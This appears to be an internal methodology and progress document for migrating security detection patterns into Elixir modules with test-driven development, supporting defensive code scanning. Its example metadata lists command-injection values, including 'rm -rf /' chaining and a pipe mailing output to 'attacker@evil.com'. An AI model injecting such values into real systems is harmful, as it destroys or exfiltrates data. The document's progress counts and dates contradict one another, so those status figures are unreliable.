# Pattern Migration Methodology

## Overview

This document describes our Test-Driven Development (TDD) approach to migrating security patterns from language-based files to individual pattern modules with comprehensive vulnerability metadata.

## Migration Status

**Current Progress**: 115 out of 157 patterns migrated (73.2%)

**Completed Patterns** (✓ = has AST enhancement, ✗ = needs AST enhancement):

JavaScript Patterns (30):
- `js-sql-injection-concat` ✓✓ (SQL Injection via String Concatenation) - AST migrated to pattern file
- `js-sql-injection-interpolation` ✓✓ (SQL Injection via String Interpolation) - AST migrated to pattern file
- `js-xss-innerhtml` ✓✓ (Cross-Site Scripting via innerHTML) - AST migrated to pattern file
- `js-xss-document-write` ✓✓ (Cross-Site Scripting via document.write) - AST migrated to pattern file
- `js-command-injection-exec` ✓✓ (Command Injection via exec) - AST migrated to pattern file
- `js-path-traversal-join` ✓✓ (Path Traversal via path.join) - AST migrated to pattern file
- `js-path-traversal-concat` ✓✓ (Path Traversal via String Concatenation) - AST migrated to pattern file
- `js-weak-crypto-md5` ✓✓ (Weak Cryptography - MD5) - AST included in pattern file
- `js-weak-crypto-sha1` ✓✓ (Weak Cryptography - SHA1) - AST included in pattern file
- `js-hardcoded-secret-password` ✓✓ (Hardcoded Password) - AST included in pattern file
- `js-hardcoded-secret-api-key` ✓✓ (Hardcoded API Key) - AST included in pattern file
- `js-eval-user-input` ✓✓ (Dangerous eval() with User Input) - AST migrated to pattern file
- `js-command-injection-spawn` ✓✓ (Command Injection via spawn with shell) - AST migrated to pattern file
- `js-unsafe-regex` ✓✓ (Regular Expression Denial of Service - ReDoS) - AST included in pattern file
- `js-prototype-pollution` ✓✓ (Prototype Pollution) - AST migrated to pattern file
- `js-insecure-deserialization` ✓✓ (Insecure Deserialization) - AST included in pattern file
- `js-open-redirect` ✓✓ (Open Redirect Vulnerability) - AST migrated to pattern file
- `js-xxe-external-entities` ✓✓ (XML External Entity Injection) - AST included in pattern file
- `js-nosql-injection` ✓✓ (NoSQL Injection) - AST migrated to pattern file
- `js-ldap-injection` ✓✓ (LDAP Injection) - AST migrated to pattern file (template literal test skipped)
- `js-xpath-injection` ✓✓ (XPath Injection) - AST migrated to pattern file
- `js-ssrf` ✓✓ (Server-Side Request Forgery) - AST migrated to pattern file
- `js-missing-csrf` ✓✓ (Missing CSRF Protection) - AST migrated to pattern file
- `js-jwt-none-algorithm` ✓✓ (JWT None Algorithm Vulnerability) - AST included in pattern file
- `js-debug-console-log` ✓✓ (Sensitive Data in Console Logs) - AST included in pattern file
- `js-insecure-random` ✓✓ (Insecure Random Number Generation) - AST included in pattern file
- `js-timing-attack` ✓✓ (Timing Attack via String Comparison) - AST included in pattern file
- `js-xss-jquery-html` ✓✓ (XSS via jQuery html() Method) - AST included in pattern file
- `js-xss-react-dangerously` ✓✓ (XSS via React dangerouslySetInnerHTML) - AST included in pattern file
- `js-xss-dom-manipulation` ✓✓ (XSS via DOM Manipulation Methods) - AST included in pattern file

Python Patterns (12):
- `python-unsafe-pickle` ✓✓ (Insecure Deserialization via pickle) - AST included in pattern file
- `python-unsafe-eval` ✓✓ (Code Injection via eval()) - AST included in pattern file
- `python-sql-injection-format` ✓✓ (SQL Injection via % Formatting) - AST included in pattern file
- `python-sql-injection-fstring` ✓✓ (SQL Injection via F-String Formatting) - AST included in pattern file
- `python-sql-injection-concat` ✓✓ (SQL Injection via String Concatenation) - AST included in pattern file
- `python-command-injection-os-system` ✓✓ (Command Injection via os.system) - AST included in pattern file
- `python-command-injection-subprocess-shell` ✓✓ (Command Injection via subprocess with shell=True) - AST included in pattern file
- `python-path-traversal-open` ✓✓ (Path Traversal via open()) - AST included in pattern file
- `python-weak-hash-md5` ✓✓ (Weak Cryptographic Hash - MD5) - AST included in pattern file
- `python-weak-hash-sha1` ✓✓ (Weak Cryptographic Hash - SHA1) - AST included in pattern file
- `python-debug-true` ✓✓ (Debug Mode Enabled) - AST included in pattern file
- `python-unsafe-yaml-load` ✓✓ (Unsafe YAML Deserialization) - AST included in pattern file

PHP Patterns (18):
- `php-sql-injection-concat` ✓✓ (SQL Injection via String Concatenation) - AST included in pattern file
- `php-sql-injection-interpolation` ✓✓ (SQL Injection via Variable Interpolation) - AST included in pattern file
- `php-command-injection` ✓✓ (Command Injection) - AST included in pattern file
- `php-xss-echo` ✓✓ (XSS via echo) - AST included in pattern file
- `php-unsafe-deserialization` ✓✓ (Unsafe Deserialization) - AST included in pattern file
- `php-xxe-vulnerability` ✓✓ (XML External Entity Vulnerability) - AST included in pattern file
- `php-path-traversal` ✓✓ (Path Traversal) - AST included in pattern file
- `php-ssrf-vulnerability` ✓✓ (Server-Side Request Forgery) - AST included in pattern file
- `php-session-fixation` ✓✓ (Session Fixation) - AST included in pattern file
- `php-weak-crypto` ✓✓ (Weak Cryptography) - AST included in pattern file
- `php-ldap-injection` ✓✓ (LDAP Injection) - AST included in pattern file
- `php-xpath-injection` ✓✓ (XPath Injection) - AST included in pattern file
- `php-eval-usage` ✓✓ (Code Injection via eval()) - AST included in pattern file
- `php-extract-usage` ✓✓ (Variable Overwrite via extract()) - AST included in pattern file
- `php-register-globals` ✓✓ (Register Globals Dependency) - AST included in pattern file
- `php-open-redirect` ✓✓ (Open Redirect) - AST included in pattern file
- `php-missing-csrf-token` ✓✓ (Missing CSRF Token) - AST included in pattern file
- `php-debug-mode-enabled` ✓✓ (Debug Mode Enabled) - AST included in pattern file
- `php-error-display` ✓✓ (Error Display) - AST included in pattern file
- `php-file-upload-no-validation` ✓✓ (File Upload without Validation) - AST included in pattern file

Ruby Patterns (20/20 completed ✅):
- `ruby-broken-access-control-missing-auth` ✓✓ (Missing Authentication in Rails Controller) - AST included in pattern file
- `ruby-mass-assignment` ✓✓ (Mass Assignment Vulnerability) - AST included in pattern file  
- `ruby-weak-crypto-md5` ✓✓ (Weak Cryptography - MD5 Usage) - AST included in pattern file
- `ruby-hardcoded-secrets` ✓✓ (Hardcoded Secrets) - AST included in pattern file
- `ruby-sql-injection-interpolation` ✓✓ (SQL Injection via String Interpolation) - AST included in pattern file
- `ruby-command-injection` ✓✓ (Command Injection) - AST included in pattern file
- `ruby-xpath-injection` ✓✓ (XPath Injection) - AST included in pattern file
- `ruby-ldap-injection` ✓✓ (LDAP Injection) - AST included in pattern file
- `ruby-weak-random` ✓✓ (Weak Random Number Generation) - AST included in pattern file
- `ruby-debug-mode` ✓✓ (Debug Mode Enabled) - AST included in pattern file
- `ruby-eval-usage` ✓✓ (Dangerous Eval Usage) - AST included in pattern file
- `ruby-weak-password-storage` ✓✓ (Weak Password Storage) - AST included in pattern file
- `ruby-unsafe-deserialization-marshal` ✓✓ (Unsafe Deserialization - Marshal) - AST included in pattern file
- `ruby-unsafe-yaml` ✓✓ (Unsafe YAML Loading) - AST included in pattern file
- `ruby-insufficient-logging` ✓✓ (Insufficient Security Logging) - AST included in pattern file
- `ruby-ssrf-open-uri` ✓✓ (SSRF via open-uri) - AST included in pattern file
- `ruby-xss-erb-raw` ✓✓ (XSS in ERB Templates) - AST included in pattern file
- `ruby-path-traversal` ✓✓ (Path Traversal) - AST included in pattern file
- `ruby-open-redirect` ✓✓ (Open Redirect) - AST included in pattern file
- `ruby-insecure-cookie` ✓✓ (Insecure Cookie Settings) - AST included in pattern file

**Ruby Pattern Migration Complete!** 🎉

**TODO for Rails Pattern Enhancement**: Review OSTIF Ruby on Rails security audit findings:
- Primary report: https://ostif.org/ruby-on-rails-audit-complete/
- Technical audit: https://ostif.org/wp-content/uploads/2025/06/X41-Rails-Audit-Final-Report-PUBLIC.pdf
- Action: Incorporate pattern coverage for any newly revealed vulnerabilities
- Timing: Best fit for post-migration effort to avoid scope creep during current TDD migration
- **IMPORTANT**: Ensure we review both reports when working on Rails vulnerability patterns to incorporate any new vulnerability patterns discovered in the audit

Java Patterns (17/17 completed ✅):
- `java-sql-injection-statement` ✓✓ (SQL Injection via Statement) - AST included in pattern file
- `java-sql-injection-string-format` ✓✓ (SQL Injection via String.format) - AST included in pattern file
- `java-unsafe-deserialization` ✓✓ (Unsafe Deserialization via ObjectInputStream) - AST included in pattern file
- `java-xpath-injection` ✓✓ (XPath Injection) - AST included in pattern file
- `java-command-injection-runtime-exec` ✓✓ (Command Injection via Runtime.exec) - AST included in pattern file
- `java-command-injection-processbuilder` ✓✓ (Command Injection via ProcessBuilder) - AST included in pattern file
- `java-path-traversal-file` ✓✓ (Path Traversal via File) - AST included in pattern file
- `java-path-traversal-fileinputstream` ✓✓ (Path Traversal via FileInputStream) - AST included in pattern file
- `java-weak-hash-md5` ✓✓ (Weak Cryptography - MD5) - AST included in pattern file
- `java-weak-hash-sha1` ✓✓ (Weak Cryptography - SHA1) - AST included in pattern file
- `java-weak-cipher-des` ✓✓ (Weak Cryptography - DES) - AST included in pattern file
- `java-xxe-documentbuilder` ✓✓ (XXE via DocumentBuilder) - AST included in pattern file
- `java-xxe-saxparser` ✓✓ (XXE via SAXParser) - AST included in pattern file
- `java-ldap-injection` ✓✓ (LDAP Injection) - AST included in pattern file
- `java-hardcoded-password` ✓✓ (Hardcoded Credentials) - AST included in pattern file
- `java-weak-random` ✓✓ (Weak Random Number Generation) - AST included in pattern file
- `java-trust-all-certs` ✓✓ (Trust All Certificates) - AST included in pattern file

**Critical Issue**: hardcoded_secrets has duplicate implementation - delegated version AND inline version (lines 151-183). Remove duplicate.

**AST Enhancement Status**: 
- 115/115 patterns have AST rules (100%)
- 115/115 AST enhancements included in pattern files (100%)
- 0 AST enhancements in central file

**AST Migration Progress**: ✅ COMPLETE - All AST enhancements successfully migrated from central ast_pattern.ex to individual pattern files

Elixir Patterns (11/28 completed):
- `elixir-sql-injection-interpolation` ✓✓ (Ecto SQL Injection via String Interpolation) - AST included in pattern file
- `elixir-sql-injection-fragment` ✓✓ (Unsafe Ecto Fragment Usage) - AST included in pattern file
- `elixir-command-injection-system` ✓✓ (OS Command Injection via System.shell/:os.cmd/Port.open) - AST included in pattern file
- `elixir-xss-raw-html` ✓✓ (XSS via raw/html_safe in Phoenix) - AST included in pattern file
- `elixir-insecure-random` ✓✓ (Insecure Random Number Generation) - AST included in pattern file
- `elixir-unsafe-atom-creation` ✓✓ (Unsafe Atom Creation from User Input) - AST included in pattern file
- `elixir-code-injection-eval` ✓✓ (Code Injection via eval) - AST included in pattern file
- `elixir-deserialization-erlang` ✓✓ (Unsafe Erlang Term Deserialization) - AST included in pattern file
- `elixir-path-traversal` ✓✓ (Path Traversal Vulnerability) - AST included in pattern file
- `elixir-ssrf-httpoison` ✓✓ (SSRF via HTTPoison) - AST included in pattern file
- `elixir-weak-crypto-md5` ✓✓ (Weak Cryptography - MD5) - AST included in pattern file

**Current Task**: Elixir patterns IN PROGRESS (11/28) - weak_crypto_md5 COMPLETE ✅ 
**Next Up**: Continue Elixir pattern migration (17 remaining)

**CHECKPOINT COMPLETED**: After completing the XXE pattern (19th pattern), we evaluated the architecture:

**Checkpoint Results (June 11, 2025)**:
1. ✅ **Architecture Validated**: Pattern flow from RSOLV-api to RSOLV-action working correctly
2. ✅ **Integration Verified**: PatternAPIClient successfully retrieves and converts patterns
3. ✅ **E2E Test Infrastructure Created**: docker-compose.e2e.yml and testing guide
4. ⚠️ **Issues Found**:
   - Metadata endpoints returning 500 errors for migrated patterns
   - Not all patterns deployed to production (only 13/19 visible)
   - Some patterns not detecting vulnerabilities in public tier

**Required Before Continuing**:
- ✅ Fix tier filtering logic (COMPLETED - fixed ast_pattern.ex filter_by_tier)
- Fix metadata endpoint errors (add patterns to controller lookup)
- Verify all 19 patterns are deployed
- Run docker-compose E2E tests locally
- Test with proper API credentials

See `/PATTERN-ARCHITECTURE-EVALUATION.md` for detailed findings.

## Migration Approach

### 1. Pre-Migration Research Phase (NEW)

**IMPORTANT**: Before writing any tests or code, conduct comprehensive vulnerability research using Kagi MCP:

1. **CVE Research using Kagi MCP**:
   ```
   Search for: "[vulnerability type] [language] CVE examples"
   Search for: "[vulnerability] Rails security incidents" 
   Search for: "OWASP [vulnerability] [language] real world"
   ```
   - Find at least 4 real CVE examples with CVSS scores
   - Document actual breaches or incidents
   - Identify common vulnerable code patterns

2. **Attack Vector Research**:
   - Research exploitation techniques
   - Find proof-of-concept payloads
   - Document bypass techniques

3. **Best Practices Research**:
   - Search for secure coding guidelines
   - Find framework-specific security recommendations
   - Research modern mitigation techniques

### 2. Test-Driven Development (TDD) Methodology

After completing research, we follow strict TDD for every pattern migration:

1. **Red Phase**: Write failing tests first (informed by research)
   - Pattern structure tests
   - Metadata validation tests  
   - Vulnerability detection tests
   - Safe code validation tests
   - AST enhancement tests:
     - Test ast_enhancement/0 returns correct structure
     - Test AST rules match expected patterns
     - Test context rules (exclusions, validations)
     - Test confidence scoring and adjustments
     - Test enhanced_pattern() uses ast_enhancement()

2. **Green Phase**: Implement pattern to make tests pass
   - Create pattern module with `use PatternBase`
   - Implement `pattern/0` function
   - Implement `vulnerability_metadata/0` function
   - Research and document comprehensive metadata
   - **Implement `ast_enhancement/0` function with doctests**

3. **Refactor Phase**: Improve implementation and tests
   
   **Implementation Refactoring**:
   - Refine the implementation for better readability and clarity
   - Optimize regex patterns if there are performance concerns (rare)
   - Improve code structure and organization
   - Ensure doctests are illustrative and comprehensive
   - Review vulnerability metadata for completeness and accuracy
   - Refine AST enhancement rules based on test results
   
   **Test Refactoring**:
   - Improve test structure and remove redundancies
   - Ensure test names clearly describe what they're testing
   - Group related tests logically
   - Add edge cases discovered during implementation
   - Make tests more maintainable and readable
   
   **Integration**:
   - Update parent language module to delegate to new pattern
   - Add pattern to doctests test file
   - Run all tests to ensure nothing broke
   - Verify pattern appears correctly in API responses

4. **Progress Tracking**: Update all tracking mechanisms
   - Update PATTERN_MIGRATION_METHODOLOGY.md with completed pattern
   - Update todo list via TodoWrite
   - Track progress in SQLite MCP table `pattern_migration_progress` (if available, proceed if not):
     ```sql
     INSERT OR REPLACE INTO pattern_migration_progress 
     (pattern_id, pattern_name, language, migration_status, has_ast_enhancement, migrated_date, notes)
     VALUES ('pattern-id', 'Pattern Name', 'language', 'completed', 1, DATE('now'), 'AST included in pattern file')
     ```
   - Commit with descriptive message including progress (e.g., "34/157 patterns completed")

### 3. Vulnerability Research Requirements

For each pattern, the pre-migration research phase should produce:

- **CVE Examples**: Real-world vulnerabilities with CVE IDs, severity scores, and descriptions
- **Attack Vectors**: Specific exploitation techniques and payloads
- **Impact Assessment**: Real-world consequences of successful attacks
- **Authoritative References**: Links to CWE, OWASP, NIST, and security research
- **Safe Alternatives**: Concrete, actionable remediation guidance

### 4. Metadata Schema

Each pattern includes structured vulnerability metadata (populated from research phase):

```elixir
def vulnerability_metadata do
  %{
    description: "Detailed technical description of the vulnerability...",
    references: [
      %{
        type: :cwe, 
        id: "CWE-89", 
        title: "Improper Neutralization of Special Elements...",
        url: "https://cwe.mitre.org/data/definitions/89.html"
      },
      %{
        type: :owasp,
        id: "A03:2021", 
        title: "OWASP Top 10 2021 - A03 Injection",
        url: "https://owasp.org/Top10/A03_2021-Injection/"
      },
      %{
        type: :research,
        id: "nodejs_command_injection",
        title: "NodeJS Command Injection: Examples and Prevention", 
        url: "https://www.stackhawk.com/blog/nodejs-command-injection-examples-and-prevention/"
      }
    ],
    attack_vectors: [
      "Command chaining: userInput = 'file.txt; rm -rf /'",
      "Command substitution: userInput = '$(whoami)'",
      "Pipe injection: userInput = 'file.txt | mail attacker@evil.com'"
    ],
    real_world_impact: [
      "Remote code execution with application privileges",
      "Data exfiltration via command output or network tools",
      "System compromise through reverse shells"
    ],
    cve_examples: [
      %{
        id: "CVE-2024-21488",
        description: "Command injection in network npm package via child_process.exec",
        severity: "critical",
        cvss: 9.8,
        note: "Arbitrary command execution through unsanitized exec() calls"
      }
    ],
    detection_notes: "Technical notes about detection methodology...",
    safe_alternatives: [
      "Use execFile() with arguments array: execFile('ls', [userInput])",
      "Use spawn() without shell option: spawn('git', ['clone', url])",
      "Validate input against allowlist before any command execution"
    ],
    additional_context: %{
      common_mistakes: [
        "Believing that escaping quotes is sufficient protection",
        "Assuming certain characters are 'safe' (they're not)"
      ],
      secure_patterns: [
        "Always use execFile() or spawn() when possible",
        "If shell features needed, use spawn() with explicit shell array"
      ]
    }
  }
end
```

### 4. Pattern Module Structure

Each pattern follows this structure:

```elixir
defmodule RsolvApi.Security.Patterns.Javascript.PatternName do
  @moduledoc """
  Brief description with examples of vulnerable and safe code.
  
  ## Vulnerability Details
  Technical explanation...
  
  ### Attack Example
  ```javascript
  // Vulnerable code example
  ```
  """
  
  use RsolvApi.Security.Patterns.PatternBase
  alias RsolvApi.Security.Pattern
  
  @impl true
  def pattern do
    %Pattern{
      id: "js-pattern-name",
      name: "Human Readable Pattern Name", 
      description: "Brief description for API",
      type: :vulnerability_type,
      severity: :critical | :high | :medium | :low,
      languages: ["javascript", "typescript"],
      regex: ~r/detection_pattern/,
      default_tier: :public | :protected | :private,
      cwe_id: "CWE-XXX",
      owasp_category: "AXX:2021", 
      recommendation: "Brief remediation guidance",
      test_cases: %{
        vulnerable: [
          "vulnerable code example 1",
          "vulnerable code example 2"
        ],
        safe: [
          "safe code example 1", 
          "safe code example 2"
        ]
      }
    }
  end
  
  def vulnerability_metadata do
    # Comprehensive metadata as shown above
  end
end
```

### 5. AST Enhancement Requirements

**MANDATORY**: Every migrated pattern must include AST enhancement rules to reduce false positives.

**NEW APPROACH**: AST enhancement is now implemented directly in each pattern module via the `ast_enhancement/0` function, not in a centralized file.

**Research Note**: Use Kagi MCP for additional research on AST patterns, security best practices, 
and false positive reduction strategies when enhancing patterns. This is especially helpful for:
- Understanding modern framework-specific security patterns
- Researching safe vs unsafe API usage patterns
- Finding common false positive scenarios in real codebases
- Discovering security library usage patterns (sanitizers, validators, etc.)

Add AST enhancement directly in your pattern module:

```elixir
@doc """
Returns AST enhancement rules to reduce false positives.

This enhancement helps distinguish between actual vulnerabilities and false positives.

## Examples

    iex> enhancement = PatternModule.ast_enhancement()
    iex> Map.keys(enhancement)
    [:ast_rules, :context_rules, :confidence_rules, :min_confidence]
    
    iex> enhancement = PatternModule.ast_enhancement()
    iex> enhancement.min_confidence
    0.8
"""
@impl true
def ast_enhancement do
  %{
    ast_rules: %{
      node_type: "CallExpression",  # AST node type to match
      # Additional AST matching rules
      callee: %{
        object_patterns: ["app", "router"],
        property_patterns: ["post", "put", "patch", "delete"]
      },
      # Context requirements
      route_analysis: %{
        has_state_changing_method: true,
        not_in_middleware_chain: true
      }
    },
    context_rules: %{
      exclude_paths: [~r/test/, ~r/spec/, ~r/__tests__/],
      exclude_if_validated: true,  # Skip if input is validated
      safe_if_uses: ["sanitization_function", "validation_library"]
    },
    confidence_rules: %{
      base: 0.5,  # Starting confidence
      adjustments: %{
        "has_direct_user_input" => 0.3,
        "uses_validation" => -0.5,
        "in_test_code" => -1.0
      }
    },
    min_confidence: 0.7  # Minimum confidence to report
  }
end
```

**Doctest Requirements**: Include doctests that verify AST enhancement:
- Test that the function returns the expected keys
- Test key values like node_type and min_confidence
- Test that confidence adjustments exist
- Test any pattern-specific AST rules

AST rules should:
- Target specific AST node types relevant to the vulnerability
- Check for presence of validation/sanitization
- Exclude test and mock code
- Provide confidence scoring to filter uncertain matches
- Consider framework-specific safe patterns

### 6. Integration Requirements

After creating each pattern module:

1. **Update Parent Module**: Modify the language module (e.g., `Javascript`) to delegate to the new pattern module
2. **Verify AST Enhancement**: Ensure ast_enhancement/0 is properly implemented with doctests
3. **Run Integration Tests**: Verify all tests pass including AST enhancement tests
4. **Test API Endpoints**: Ensure patterns appear in API responses and metadata endpoints work
5. **Verify False Positive Reduction**: Test enhanced_pattern() on known safe code
6. **Update Pattern Count**: Update any documentation that tracks pattern counts

### 6. File Organization

```
lib/rsolv_api/security/patterns/
├── pattern_base.ex                    # Base macro for all patterns
├── javascript/
│   ├── sql_injection_concat.ex        # Individual pattern files
│   ├── xss_innerhtml.ex
│   └── command_injection_exec.ex
├── python/
├── ruby/
└── javascript.ex                      # Main language module (delegates to individual patterns)
```

### 7. Testing Strategy

Each pattern includes comprehensive tests:

- **Pattern Structure Tests**: Verify pattern returns correct structure
- **Metadata Tests**: Validate metadata schema and content  
- **Detection Tests**: Test regex against vulnerable code samples
- **Safe Code Tests**: Verify pattern doesn't match safe code
- **Integration Tests**: Verify pattern works through API endpoints
- **File Applicability Tests**: Test `applies_to_file?/1` and `applies_to_file?/2`

### 8. Doctest Requirements

**MANDATORY**: Every pattern must include comprehensive doctests with working examples.

Doctests serve multiple purposes:
- Inline documentation with executable examples
- Additional testing for pattern behavior
- API contract verification
- Example code for developers

Required doctest structure for each pattern:

```elixir
@doc """
Pattern detects [vulnerability type] in JavaScript/TypeScript code.

Brief description of what the pattern detects and why it's dangerous.

## Examples

    iex> pattern = PatternModule.pattern()
    iex> pattern.id
    "js-pattern-name"
    
    iex> pattern = PatternModule.pattern()
    iex> pattern.severity
    :high
    
    iex> pattern = PatternModule.pattern()
    iex> vulnerable = "vulnerable code example"
    iex> Regex.match?(pattern.regex, vulnerable)
    true
    
    iex> pattern = PatternModule.pattern()
    iex> safe = "safe code example"
    iex> Regex.match?(pattern.regex, safe)
    false
"""
```

**Doctest Standards**:
- Include at least 4 doctests per pattern function
- Test pattern structure (id, severity)
- Test vulnerable code detection (at least 1 example)  
- Test safe code exclusion (at least 1 example)
- Use realistic, representative code examples
- Examples should be clear and educational

## Quality Standards

### Research Requirements
- All CVE examples must be real and verified
- References must be authoritative (CWE, OWASP, NIST, peer-reviewed research)
- Attack vectors must be concrete and realistic
- Safe alternatives must be actionable and secure

### Code Quality
- Follow existing Elixir conventions and style
- Comprehensive test coverage (aim for 100%)
- Clear, descriptive variable and function names
- Inline documentation for complex logic

### Performance Considerations  
- Regex patterns should be efficient
- Avoid catastrophic backtracking
- Consider compile-time optimizations where possible

## Retroactive AST Enhancement

All patterns now have AST enhancement rules! This section is no longer needed.

### Completed AST Enhancements (January 13, 2025):
✅ **All 6 remaining patterns completed**:
- `js-weak-crypto-md5` - Clear vulnerability (AST enhancement added January 13, 2025)
- `js-weak-crypto-sha1` - Excludes non-security uses like Git, checksums
- `js-hardcoded-secret-password` - High min_confidence (0.8) for many false positives
- `js-hardcoded-secret-api-key` - Detects known API key formats
- `js-unsafe-regex` - Checks for nested quantifiers and safe regex libraries
- `js-insecure-deserialization` - Validates safe parsing methods (safeLoad, etc.)
- `js-xxe-external-entities` - Distinguishes browser DOMParser from Node.js XML parsers

### Previously Completed AST Enhancements (June 12, 2025):
✅ High Priority patterns completed:
- `js-sql-injection-concat` - Checks for database context, excludes logging
- `js-sql-injection-interpolation` - Validates template literal context
- `js-xss-innerhtml` - Checks for sanitization libraries (DOMPurify, etc.)
- `js-xss-document-write` - Excludes build tools and static content
- `js-eval-user-input` - Verifies user input and checks for sandboxing

✅ Medium Priority patterns completed:
- `js-path-traversal-join` - Validates path checking and normalization
- `js-path-traversal-concat` - Distinguishes file paths from URLs
- `js-open-redirect` - Checks for URL validation and allowlists
- `js-prototype-pollution` - Validates key checking and Map usage
- `js-ldap-injection` - Checks for LDAP escape functions
- `js-xpath-injection` - Verifies parameterized queries

## Migration Priorities

### High Priority (Next 4 weeks)
1. **Retroactive AST Enhancement** for high-FP patterns above
2. **Path Traversal patterns** (~10 patterns) - Natural continuation
3. **XSS patterns** (~8 remaining patterns) - Build on completed XSS work
4. **Authentication/Authorization patterns** (~15 patterns) - High impact vulnerabilities

### Medium Priority (Next 8 weeks)
5. **Deserialization patterns** (~5 patterns)
6. **Mass Assignment patterns** (~5 patterns)  
7. **Cryptographic patterns** (~10 patterns)

### Lower Priority (Remaining patterns)
8. **Information Disclosure patterns**
9. **Business Logic patterns**
10. **Framework-specific patterns**

## Session Context Management

This document serves as our running context for the migration process. Key points:

- **Update this document** as we complete each pattern migration
- **Track progress** in the TODO list via TodoWrite/TodoRead tools
- **Document issues** and resolutions as they arise
- **Track in SQLite MCP** using the `pattern_migration_progress` table:
  - Table tracks: pattern_id, pattern_name, language, migration_status, has_ast_enhancement, migrated_date, notes
  - Status values: 'pending', 'in_progress', 'completed'
  - Query progress: `SELECT COUNT(*) as completed FROM pattern_migration_progress WHERE migration_status = 'completed'`
- **Clean up SQLite MCP context** when migration is complete

## Cleanup Plan

When pattern migration is complete:
1. Remove this methodology document (it's session-specific)
2. Clean up SQLite MCP context used for session tracking
3. Update main project documentation with final architecture
4. Archive temporary migration tracking files

---

**Last Updated**: January 16, 2025 - 115 patterns migrated (73.2%), 115 patterns AST-enhanced (100%), 115 AST enhancements included in pattern files
**Next Action**: Continue Elixir pattern migration (11/28 completed)
**Achievement**: ✅ Successfully migrated ALL Java patterns (17/17), Ruby patterns (20/20), Python patterns (12/12)
**Current Work**: 🚀 Elixir pattern migration in progress (weak_crypto_md5 COMPLETE)

## Session Handoff Summary (January 14, 2025)

### What Was Accomplished (Previous Session - January 13)
1. **JavaScript Pattern Migration COMPLETE**: All 30 JavaScript patterns successfully migrated
2. **AST Enhancement Migration COMPLETE**: All AST enhancements migrated from central file to individual patterns
3. **Started Python Migration**: Began migrating Python patterns starting with unsafe_pickle

### What Was Accomplished (Current Session - January 14)
1. **Python Patterns Migrated**:
   - `python-unsafe-pickle`: Fixed regex to avoid matching json.loads using word boundary
   - `python-unsafe-eval`: Created with comprehensive vulnerability metadata and AST enhancement
2. **Pattern Module Updates**:
   - Updated Python module to delegate to new pattern modules
   - Added doctests to patterns_doctest_test.exs
3. **TDD Methodology**: Followed red-green-refactor with 23 passing tests for Python patterns

### Current State
- **42 patterns migrated** (26.8% of 157 total)
  - JavaScript: 30 patterns (COMPLETE ✅)
  - Python: 12 patterns (COMPLETE ✅)
- **42 patterns have AST enhancements** (all included in pattern files)
- **0 patterns need AST enhancements**: All migrated patterns now have AST rules!
- **Pattern files location**: `/home/dylan/dev/rsolv/RSOLV-api/lib/rsolv_api/security/patterns/`
- **Test files location**: `/home/dylan/dev/rsolv/RSOLV-api/test/rsolv_api/security/patterns/`

### Todo List Summary
**High Priority In Progress**:
1. Migrate all existing patterns to new file structure (34/157 completed) - id: 24
2. Continue with remaining patterns (34 completed) - id: 62
3. Continue pattern migration after AST refactoring - id: 96

**High Priority Pending**:
1. Deploy AST enhancements to production API - id: 13
2. Verify AST enhancements work end-to-end in production - id: 14
3. Verify all 34 migrated patterns are deployed to production - id: 80
4. ✅ COMPLETE: Migrate all Python patterns (12 total) - id: 117

### Python Patterns COMPLETE ✅
All 12 Python patterns have been successfully migrated:
1. ✅ `python-unsafe-pickle` - Insecure deserialization
2. ✅ `python-unsafe-eval` - Code injection via eval()
3. ✅ `python-sql-injection-format` - SQL injection via % formatting
4. ✅ `python-sql-injection-fstring` - SQL injection via f-strings
5. ✅ `python-sql-injection-concat` - SQL injection via concatenation
6. ✅ `python-command-injection-os-system` - Command injection via os.system
7. ✅ `python-command-injection-subprocess-shell` - Command injection via subprocess
8. ✅ `python-path-traversal-open` - Path traversal via open()
9. ✅ `python-weak-hash-md5` - Weak cryptography using MD5
10. ✅ `python-weak-hash-sha1` - Weak cryptography using SHA1
11. ✅ `python-debug-true` - Debug mode enabled (Django/Flask)
12. ✅ `python-unsafe-yaml-load` - Insecure deserialization via yaml.load()

### Next Language: PHP
Next patterns to migrate are PHP patterns.

### Git Status
- Working tree is clean
- All changes committed
- 8 commits ahead of origin/main (push needed when SSH key is fixed)